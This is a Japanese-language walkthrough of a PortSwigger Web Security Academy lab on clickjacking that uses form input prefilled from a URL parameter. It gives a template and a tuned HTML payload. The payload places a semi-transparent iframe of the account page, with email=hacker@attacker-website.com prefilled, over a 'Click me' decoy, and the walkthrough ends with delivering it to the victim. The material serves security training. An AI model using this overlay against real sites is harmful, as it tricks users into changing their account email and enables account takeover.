# URL パラメーターから事前入力されたフォーム入力データによるクリックジャッキング

次のハッキングラボを実施します  
https://portswigger.net/web-security/clickjacking/lab-prefilled-form-input  
このラボでは、「ラボ: CSRF トークン保護を使用した基本的なクリックジャッキング」の基本的なクリックジャッキングの例を拡張します。

- 1. 一般ユーザーでログインします
- 2. エクスプロイト サーバーに移動し、次の HTML テンプレートを Body セクションに貼り付けます。

```html
<style>
  iframe {
    position: relative;
    width: $width_value;
    height: $height_value;
    opacity: $opacity;
    z-index: 2;
  }
  div {
    position: absolute;
    top: $top_value;
    left: $side_value;
    z-index: 1;
  }
</style>
<div>Test me</div>
<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
```

- 3. クリックジャッキングの位置をメールアドレス更新ボタンに合うように調整します
     ![1](https://github.com/pea-sys/web-security-experiments/assets/49807271/61779d2e-c235-4468-9bd3-5fbc751933ac)

```html
<style>
  iframe {
    position: relative;
    width: 700px;
    height: 700px;
    opacity: 0.5;
    z-index: 2;
  }
  div {
    position: absolute;
    top: 510px;
    left: 60px;
    z-index: 1;
  }
</style>
<div>Click me</div>
<iframe src="https://0a4c00db03faec16814fc34e0080000d.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
```

- 4. Store ボタンを押して、deliver exploit to victim ボタンを押します。
